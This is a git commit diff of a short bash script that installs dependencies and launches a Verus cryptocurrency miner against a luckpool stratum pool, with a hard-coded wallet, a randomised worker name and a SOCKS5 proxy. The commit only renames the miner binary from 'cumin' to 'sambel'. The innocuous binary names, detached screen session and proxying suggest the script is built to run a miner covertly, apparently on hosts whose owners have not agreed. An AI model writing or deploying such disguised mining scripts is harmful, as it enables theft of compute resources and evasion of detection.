a659fa5e505bb06fb8aeb61609bcc3ba1c35a2a2
gasken1 <84686224+gasken1@users.noreply.github.com>
2021-07-12 12:01:57 +0700

    Update pete.sh

--- pete.sh
+++ pete.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x cumin
+chmod +x sambel
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RTYdzcR1YraQQXz2MsKfMyTbDb35MY2x3G
 WORKER=$(echo $(shuf -i 1-7 -n 1)-REVOKE)
 PROXY=socks5://98.185.83.121:4145
-./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+./sambel -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
